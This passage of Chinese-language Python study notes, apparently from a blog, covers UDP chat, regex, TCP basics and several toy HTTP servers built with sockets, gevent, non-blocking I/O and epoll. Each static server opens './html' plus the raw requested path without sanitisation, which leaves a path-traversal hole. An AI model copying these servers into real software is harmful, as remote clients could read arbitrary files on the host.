new_client_socket.close()</span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="udp聊天器"><a href="#udp聊天器" class="headerlink" title="udp聊天器"></a>udp聊天器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""发送消息"""</span></span><br><span class="line">    <span class="comment">#获取要发送的内容</span></span><br><span class="line">    dest_ip = input(<span class="string">"请输入对方IP："</span>)</span><br><span class="line">    dest_port = int(input(<span class="string">"请输入对方端口："</span>))</span><br><span class="line">    send_data = input(<span class="string">"请输入要发送的信息："</span>)</span><br><span class="line">    udp_socket.sendto(send_data.encode(<span class="string">"utf-8"</span>), (dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""接收数据"""</span></span><br><span class="line">    recv_data = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"%s:%s"</span> % (str(recv_data[<span class="number">1</span>]), recv_data[<span class="number">0</span>].decode(<span class="string">"utf-8"</span>)))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#创建套接字</span></span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="comment">#绑定信息</span></span><br><span class="line">    udp_socket.bind((<span class="string">""</span>, <span class="number">7788</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#循环处理</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"-----udp聊天器-----"</span>)</span><br><span class="line">        print(<span class="string">"1.发送消息"</span>)</span><br><span class="line">        print(<span class="string">"2.接收消息"</span>)</span><br><span class="line">        print(<span class="string">"0.退出"</span>)</span><br><span class="line">        op = input(<span class="string">"请输入功能："</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">"1"</span>:</span><br><span class="line">            send_msg(udp_socket)</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">"2"</span>:</span><br><span class="line">            recv_msg(udp_socket)</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">"0"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"输入有误，请重新输入"</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h1><p>WSGI协议    浏览器请求动态页面过程</p>
<p>静态，动态，伪静态</p>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.(\n除外，re.S)   []  \d  \D  \w  \W  \s  \S</span><br><span class="line">&#123;m&#125; &#123;m,n&#125;  ?    *   +</span><br><span class="line">^   $   \   |   ()</span><br><span class="line">\num</span><br><span class="line">(?P&lt;name&gt;) 分组起名 (?P&#x3D;name) 引用别名</span><br><span class="line">*? 最小匹配</span><br></pre></td></tr></table></figure>

<h3 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ret = re.search()</span><br><span class="line">ret.group()</span><br><span class="line"></span><br><span class="line">ret = re.match()</span><br><span class="line"></span><br><span class="line">ret = re.findall()</span><br><span class="line"></span><br><span class="line">ret = re.sub()  可调用函数</span><br><span class="line"></span><br><span class="line">ret = re.split()</span><br></pre></td></tr></table></figure>

<h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>三次握手：<br>syn<br>ack，syn<br>ack</p>
<p>四次挥手：</p>
<h2 id="简单web服务器实现"><a href="#简单web服务器实现" class="headerlink" title="简单web服务器实现"></a>简单web服务器实现</h2><h3 id="简单静态web服务器"><a href="#简单静态web服务器" class="headerlink" title="简单静态web服务器"></a>简单静态web服务器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#简单静态web服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">service_client</span><span class="params">(new_socket)</span>:</span></span><br><span class="line">    <span class="string">"""为这个客户端返回数据"""</span></span><br><span class="line">    request = new_socket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    print(request)</span><br><span class="line"></span><br><span class="line">    response = <span class="string">"HTTP/1.1 200 OK\r\n"</span></span><br><span class="line">    response += <span class="string">"\r\n"</span></span><br><span class="line"></span><br><span class="line">    response += <span class="string">"&lt;h1&gt;adasddsa&lt;h1/&gt;"</span></span><br><span class="line">    new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line">    new_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""用来完成整体控制"""</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 避免服务器关闭后，重启时出现端口占用</span></span><br><span class="line">    <span class="comment"># tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span></span><br><span class="line"></span><br><span class="line">    tcp_server_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        new_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line"></span><br><span class="line">        service_client(new_socket)</span><br><span class="line">    </span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="返回浏览器需要的页面http服务器"><a href="#返回浏览器需要的页面http服务器" class="headerlink" title="返回浏览器需要的页面http服务器"></a>返回浏览器需要的页面http服务器</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#返回浏览器需要的页面http服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">service_client</span><span class="params">(new_socket)</span>:</span></span><br><span class="line">    <span class="string">"""为这个客户端返回数据"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 接收浏览器发送过来的请求 ，即http请求  </span></span><br><span class="line">    <span class="comment"># GET / HTTP/1.1</span></span><br><span class="line">    <span class="comment"># .....</span></span><br><span class="line">    request = new_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="comment"># print("&gt;&gt;&gt;"*50)</span></span><br><span class="line">    <span class="comment"># print(request)</span></span><br><span class="line"></span><br><span class="line">    request_lines = request.splitlines()</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"&gt;"</span>*<span class="number">20</span>)</span><br><span class="line">    print(request_lines)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET /index.html HTTP/1.1</span></span><br><span class="line">    <span class="comment"># get post put del</span></span><br><span class="line">    file_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = re.match(<span class="string">r"[^/]+(/[^ ]*)"</span>, request_lines[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            file_name = ret.group(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># print("*"*50, file_name)</span></span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">"/"</span>:</span><br><span class="line">                file_name = <span class="string">"/index.html"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 返回http格式的数据，给浏览器</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(<span class="string">"./html"</span> + file_name, <span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        response = <span class="string">"HTTP/1.1 404 NOT FOUND\r\n"</span></span><br><span class="line">        response += <span class="string">"\r\n"</span></span><br><span class="line">        response += <span class="string">"------file not found-----"</span></span><br><span class="line">        new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># 2.1 准备发送给浏览器的数据---header</span></span><br><span class="line">        response = <span class="string">"HTTP/1.1 200 OK\r\n"</span></span><br><span class="line">        response += <span class="string">"\r\n"</span></span><br><span class="line">        <span class="comment"># 2.2 准备发送给浏览器的数据---boy</span></span><br><span class="line">        <span class="comment"># response += "hahahhah"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将response header发送给浏览器</span></span><br><span class="line">        new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 将response body发送给浏览器</span></span><br><span class="line">        new_socket.send(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭套接</span></span><br><span class="line">    new_socket.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""用来完成整体的控制"""</span></span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 绑定</span></span><br><span class="line">    tcp_server_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 变为监听套接字</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 4. 等待新客户端的链接</span></span><br><span class="line">        new_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 5. 为这个客户端服务</span></span><br><span class="line">        service_client(new_socket)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭监听套接字</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="并发web服务器"><a href="#并发web服务器" class="headerlink" title="并发web服务器"></a>并发web服务器</h2><p>multiprocessing<br>threading<br>gevent</p>
<h3 id="协程-2"><a href="#协程-2" class="headerlink" title="协程"></a>协程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用协程实现多任务服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gevent </span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">service_client</span><span class="params">(new_socket)</span>:</span></span><br><span class="line">    <span class="string">"""为这个客户端返回数据"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 接收浏览器发送过来的请求 ，即http请求  </span></span><br><span class="line">    <span class="comment"># GET / HTTP/1.1</span></span><br><span class="line">    <span class="comment"># .....</span></span><br><span class="line">    request = new_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="comment"># print("&gt;&gt;&gt;"*50)</span></span><br><span class="line">    <span class="comment"># print(request)</span></span><br><span class="line"></span><br><span class="line">    request_lines = request.splitlines()</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"&gt;"</span>*<span class="number">20</span>)</span><br><span class="line">    print(request_lines)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET /index.html HTTP/1.1</span></span><br><span class="line">    <span class="comment"># get post put del</span></span><br><span class="line">    file_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = re.match(<span class="string">r"[^/]+(/[^ ]*)"</span>, request_lines[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            file_name = ret.group(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># print("*"*50, file_name)</span></span><br><span class="line">            <span class="keyword">if</span> file_name == <span class="string">"/"</span>:</span><br><span class="line">                file_name = <span class="string">"/index.html"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 返回http格式的数据，给浏览器</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(<span class="string">"./html"</span> + file_name, <span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        response = <span class="string">"HTTP/1.1 404 NOT FOUND\r\n"</span></span><br><span class="line">        response += <span class="string">"\r\n"</span></span><br><span class="line">        response += <span class="string">"------file not found-----"</span></span><br><span class="line">        new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># 2.1 准备发送给浏览器的数据---header</span></span><br><span class="line">        response = <span class="string">"HTTP/1.1 200 OK\r\n"</span></span><br><span class="line">        response += <span class="string">"\r\n"</span></span><br><span class="line">        <span class="comment"># 2.2 准备发送给浏览器的数据---boy</span></span><br><span class="line">        <span class="comment"># response += "hahahhah"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将response header发送给浏览器</span></span><br><span class="line">        new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 将response body发送给浏览器</span></span><br><span class="line">        new_socket.send(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭套接</span></span><br><span class="line">    new_socket.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""用来完成整体的控制"""</span></span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 绑定</span></span><br><span class="line">    tcp_server_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 变为监听套接字</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 4. 等待新客户端的链接</span></span><br><span class="line">        new_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line"></span><br><span class="line">        gevent.spawn(service_client, new_socket)</span><br><span class="line">        <span class="comment"># p.start()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># new_socket.close()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭监听套接字</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="非阻塞实现并发服务器"><a href="#非阻塞实现并发服务器" class="headerlink" title="非阻塞实现并发服务器"></a>非阻塞实现并发服务器</h3><p>长连接与短连接</p>
<h4 id="长连接非阻塞并发服务器"><a href="#长连接非阻塞并发服务器" class="headerlink" title="长连接非阻塞并发服务器"></a>长连接非阻塞并发服务器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">service_client</span><span class="params">(new_socket, request)</span>:</span></span><br><span class="line">    <span class="string">"""为这个客户端返回数据"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 接收浏览器发送过来的请求 ，即http请求  </span></span><br><span class="line">    <span class="comment"># GET / HTTP/1.1</span></span><br><span class="line">    <span class="comment"># .....</span></span><br><span class="line">    <span class="comment"># request = new_socket.recv(1024).decode("utf-8")</span></span><br><span class="line">    <span class="comment"># print("&gt;&gt;&gt;"*50)</span></span><br><span class="line">    <span class="comment"># print(request)</span></span><br><span class="line"></span><br><span class="line">    request_lines = request.splitlines()</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"&gt;"</span>*<span class="number">20</span>)</span><br><span class="line">    print(request_lines)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET /index.html HTTP/1.1</span></span><br><span class="line">    <span class="comment"># get post put del</span></span><br><span class="line">    file_name = <span class="string">""</span></span><br><span class="line">    ret = re.match(<span class="string">r"[^/]+(/[^ ]*)"</span>, request_lines[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        file_name = ret.group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># print("*"*50, file_name)</span></span><br><span class="line">        <span class="keyword">if</span> file_name == <span class="string">"/"</span>:</span><br><span class="line">            file_name = <span class="string">"/index.html"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 返回http格式的数据，给浏览器</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(<span class="string">"./html"</span> + file_name, <span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        response = <span class="string">"HTTP/1.1 404 NOT FOUND\r\n"</span></span><br><span class="line">        response += <span class="string">"\r\n"</span></span><br><span class="line">        response += <span class="string">"------file not found-----"</span></span><br><span class="line">        new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        response_body = html_content</span><br><span class="line"></span><br><span class="line">        response_header = <span class="string">"HTTP/1.1 200 OK\r\n"</span></span><br><span class="line">        response_header += <span class="string">"Content-Length:%d\r\n"</span> % len(response_body)</span><br><span class="line">        response_header += <span class="string">"\r\n"</span></span><br><span class="line"></span><br><span class="line">        response = response_header.encode(<span class="string">"utf-8"</span>) + response_body</span><br><span class="line"></span><br><span class="line">        new_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""用来完成整体的控制"""</span></span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 绑定</span></span><br><span class="line">    tcp_server_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 变为监听套接字</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line">    tcp_server_socket.setblocking(<span class="literal">False</span>)  <span class="comment"># 将套接字变为非堵塞</span></span><br><span class="line"></span><br><span class="line">    client_socket_list = list()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 4. 等待新客户端的链接</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            new_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ret:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_socket.setblocking(<span class="literal">False</span>)</span><br><span class="line">            client_socket_list.append(new_socket)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> client_socket <span class="keyword">in</span> client_socket_list:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recv_data = client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> ret:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> recv_data:</span><br><span class="line">                    service_client(client_socket, recv_data)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    client_socket.close()</span><br><span class="line">                    client_socket_list.remove(client_socket)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭监听套接字</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><p>IO多路复用<br>共享内存，事件通知<br>select库</p>
<h4 id="epoll实例"><a href="#epoll实例" class="headerlink" title="epoll实例"></a>epoll实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">service_client</span><span class="params">(new_socket, request)</span>:</span></span><br><span class="line">    <span class="string">"""为这个客户端返回数据"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 接收浏览器发送过来的请求 ，即http请求  </span></span><br><span class="line">    <span class="comment"># GET / HTTP/1.1</span></span><br><span class="line">    <span class="comment"># .....</span></span><br><span class="line">    <span class="comment"># request = new_socket.recv(1024).decode("utf-8")</span></span><br><span class="line">    <span class="comment"># print("&gt;&gt;&gt;"*50)</span></span><br><span class="line">    <span class="comment"># print(request)</span></span><br><span class="line"></span><br><span class="line">    request_lines = request.splitlines()</span><br><span class="line">    print(<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"&gt;"</span>*<span class="number">20</span>)</span><br><span class="line">    print(request_lines)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET /index.html HTTP/1.1</span></span><br><span class="line">    <span class="comment"># get post put del</span></span><br><span class="line">    file_name = <span class="string">""</span></span><br><span class="line">    ret = re.match(<span class="string">r"[^/]+(/[^ ]*)"</span>, request_lines[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        file_name = ret.group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># print("*"*50, file_name)</span></span><br><span class="line">        <span class="keyword">if</span> file_name == <span class="string">"/"</span>:</span><br><span class="line">            file_name = <span class="string">"/index.html"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 返回http格式的数据，给浏览器</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(<span class="string">"./html"</span> + file_name, <span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        response = <span class="string">"HTTP/1.1 404 NOT FOUND\r\n"</span></span><br><span class="line">        response += <span class="string">"\r\n"</span></span><br><span class="line">        response += <span class="string">"------file not found-----"</span></span><br><span class="line">        new_socket.send(response.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        response_body = html_content</span><br><span class="line"></span><br><span class="line">        response_header = <span class="string">"HTTP/1.1 200 OK\r\n"</span></span><br><span class="line">        response_header += <span class="string">"Content-Length:%d\r\n"</span> % len(response_body)</span><br><span class="line">        response_header += <span class="string">"\r\n"</span></span><br><span class="line"></span><br><span class="line">        response = response_header.encode(<span class="string">"utf-8"</span>) + response_body</span><br><span class="line"></span><br><span class="line">        new_socket.send(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""用来完成整体的控制"""</span></span><br><span class="line">    <span class="comment"># 1. 创建套接字</span></span><br><span class="line">    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 绑定</span></span><br><span class="line">    tcp_server_socket.bind((<span class="string">""</span>, <span class="number">7890</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 变为监听套接字</span></span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line">    tcp_server_socket.setblocking(<span class="literal">False</span>)  <span class="comment"># 将套接字变为非堵塞</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个epoll对象</span></span><br><span class="line">    epl = select.epoll()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将监听套接字对应的fd注册到epoll中</span></span><br><span class="line">    epl.register(tcp_server_socket.fileno(), select.EPOLLIN)</span><br><span class="line"></span><br><span class="line">    fd_event_dict = dict()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        fd_event_list = epl.poll()  <span class="comment"># 默认会堵塞，直到 os监测到数据到来 通过事件通知方式 告诉这个程序，此时才会解堵塞</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># [(fd, event), (套接字对应的文件描述符, 这个文件描述符到底是什么事件 例如 可以调用recv接收等)]</span></span><br><span class="line">        <span class="keyword">for</span> fd, event <span class="keyword">in</span> fd_event_list:</span><br><span class="line">            <span class="comment"># 等待新客户端的链接</span></span><br><span class="line">            <span class="keyword">if</span> fd == tcp_server_socket.fileno():</span><br><span class="line">                new_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line">                epl.register(new_socket.fileno(), select.EPOLLIN)</span><br><span class="line">                fd_event_dict[new_socket.fileno()] = new_socket</span><br><span class="line">            <span class="keyword">elif</span> event==select.EPOLLIN:</span><br><span class="line">                <span class="comment"># 判断已经链接的客户端是否有数据发送过来</span></span><br><span class="line">                recv_data = fd_event_dict[fd].recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                <span class="keyword">if</span> recv_data:</span><br><span class="line">                    service_client(fd_event_dict[fd], recv_data)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fd_event_dict[fd].close()</span><br><span class="line">                    epl.unregister(fd)</span><br><span class="line">                    <span class="keyword">del</span> fd_event_dict[fd]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭监听套接字</span></span><br><span class="line">    tcp_server_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="网络通信-1"><a href="#网络通信-1" class="headerlink" title="网络通信"></a>网络通信</h2><p>tcp/ip 协议族    指一类协议的总称<br>wireshark<br>arp协议 交换机  mac地址</p>
<p>访问网站流程：解析域名  与目标服务器建立连接   发送请求数据和接受数据 断开连接     </p>
<h1 id="python进阶知识"><a href="#python进阶知识" class="headerlink" title="python进阶知识"></a>python进阶知识</h1><h2 id="GIL锁-全局解释锁"><a href="#GIL锁-全局解释锁" class="headerlink" title="GIL锁(全局解释锁)"></a>GIL锁(全局解释锁)</h2><p>由于历史原因，cpython解释器(其他解释器没有这个问题)中留有GIL锁，与python本身没有关系，保证统一时刻只有一个线程在运行</p>
